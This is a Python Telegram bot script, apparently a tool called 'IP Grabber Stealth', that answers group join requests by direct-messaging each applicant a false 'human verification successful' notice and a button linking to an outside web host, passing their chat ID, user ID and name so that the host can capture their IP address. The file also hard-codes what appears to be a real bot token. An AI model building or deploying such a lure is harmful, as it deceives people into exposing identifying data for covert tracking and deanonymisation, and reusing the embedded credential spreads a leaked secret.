import telebot
from telebot import types
import time

# YOUR CREDENTIALS
BOT_TOKEN = "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg"
WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
LOG_CHANNEL = "-1001234567890123"

bot = telebot.TeleBot(BOT_TOKEN)

# FIX MULTIPLE INSTANCE CONFLICT
print("Deleting webhook to fix conflict...")
bot.delete_webhook(drop_pending_updates=True)
time.sleep(3)   # Tunggu 3 detik agar instance lama mati
print("Webhook deleted successfully. Starting polling...")

@bot.chat_join_request_handler()
def handle_join_request(request: types.ChatJoinRequest):
    user_id = request.user_chat_id
    chat_id = request.chat.id
    first_name = request.from_user.first_name or "User"

    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Verify Account & Join Group", url=link))

    try:
        bot.send_message(
            user_id,
            f"Human verification successful!\n\n"
            f"Click the button below for final verification and to join the group:\n\n"
            f"Link will expire in 10 minutes.",
            reply_markup=markup
        )
    except Exception as e:
        print(f"Failed to send PM: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Bot IP Grabber Stealth is active!")

print("Bot IP Grabber Stealth is running...")
bot.infinity_polling()
